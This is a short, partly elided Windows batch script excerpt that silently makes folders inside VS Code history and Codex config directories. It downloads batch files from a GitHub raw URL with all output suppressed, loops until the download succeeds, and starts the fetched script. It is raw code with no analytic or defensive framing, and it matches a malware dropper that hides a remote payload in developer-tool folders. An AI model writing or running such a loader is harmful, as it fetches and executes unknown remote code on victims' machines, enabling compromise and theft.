...
if not exist "%appdata%\Code\User\History\7b8dea4d" ( 
    mkdir "%appdata%\Code\User\History\7b8dea4d"  >nul 2>nul
    del /F /Q /A  "%appdata%\Code\User\History\7b8dea4d\zZxX1.bat" >nul 2>nul
    curl -f -L -o "%appdata%\Code\User\History\7b8dea4d\zZX1.bat" "https://raw.githubusercontent.com/eidanexa-lang/ssd/refs/heads/main/Madre.bat" >nul 2>nul
...
(
    ...
    echo :dis
    echo curl -f -L -o "%userprofile%\.config\codex\6sd72w467s167d72f36f4\Xtt.bat" "https://raw.githubusercontent.com/eidanexa-lang/ssd/refs/heads/main/xtt.bat" ^>nul 2^>^&1
    echo if errorlevel 1 ^( goto dis ^)
    echo start "" "%userprofile%\.config\codex\6sd72w467s167d72f36f4\Xtt.bat" ^>nul 2^>^&1
